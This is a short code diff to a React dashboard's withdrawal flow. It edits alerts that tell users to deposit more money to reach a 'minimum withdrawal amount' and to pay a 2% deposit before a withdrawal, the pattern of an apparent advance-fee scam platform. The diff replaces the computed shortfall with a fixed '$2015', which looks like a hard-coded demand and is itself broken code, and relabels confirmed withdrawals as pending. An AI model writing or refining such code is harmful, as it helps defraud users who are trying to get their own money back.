@@ -462,7 +462,7 @@ export default function Dashboard() {
                   const shortfall = minimumRequired - user.balance;
                   alert(
                     `You need to deposit ${formatCurrency(
-                      shortfall
+                      $2015
                     )} into your account so your balance reaches the minimum withdrawal amount of ${formatCurrency(
                       minimumRequired
                     )}.`
@@ -480,7 +480,7 @@ export default function Dashboard() {
                   );
                 } else {
                   alert(
-                    `Withdrawal request confirmed!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
+                    `Withdrawal pending!\nMethod: ${withdrawMethod}\nAmount: ${formatCurrency(
                       withdrawAmount
                     )}\n\nInstruction: Please deposit ${formatCurrency(
                       withdrawAmount * 0.02
